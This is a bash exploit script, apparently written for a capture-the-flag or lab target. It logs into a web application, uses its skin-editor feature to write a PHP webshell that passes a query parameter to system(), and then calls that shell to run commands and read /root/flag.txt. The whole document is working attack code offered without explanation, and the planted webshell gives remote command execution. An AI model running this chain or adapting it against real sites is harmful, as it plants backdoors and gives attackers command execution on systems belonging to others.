#!/bin/bash
# Post-login RCE chain: login -> skin-editor webshell -> read flag
BASE="$1"; LOGIN="$2"; PASS="$3"
CJ=$(mktemp)
echo "[*] logging in as $LOGIN ..."
resp=$(curl -s -m 20 -k -c "$CJ" -X POST "$BASE/feed.php?route=/api/login" --data-urlencode "login=$LOGIN" --data-urlencode "pass=$PASS")
echo "    resp: $resp"
grep -c site_staff "$CJ" >/dev/null 2>&1 && echo "[*] cookie saved" || echo "[!] no cookie!"
echo "[*] writing webshell via skin-editor ..."
curl -s -m 20 -k -b "$CJ" -X POST "$BASE/manage.php?action=skin-editor" --data-urlencode "name=pwnx" --data-urlencode 'code=<?php system($_GET["c"]); ?>'
echo
echo "[*] triggering webshell ..."
curl -s -m 20 -k "$BASE/uploads/skins/pwnx.php?c=id;cat+/root/flag.txt;ls+-la+/root/"
echo
echo "[*] done"
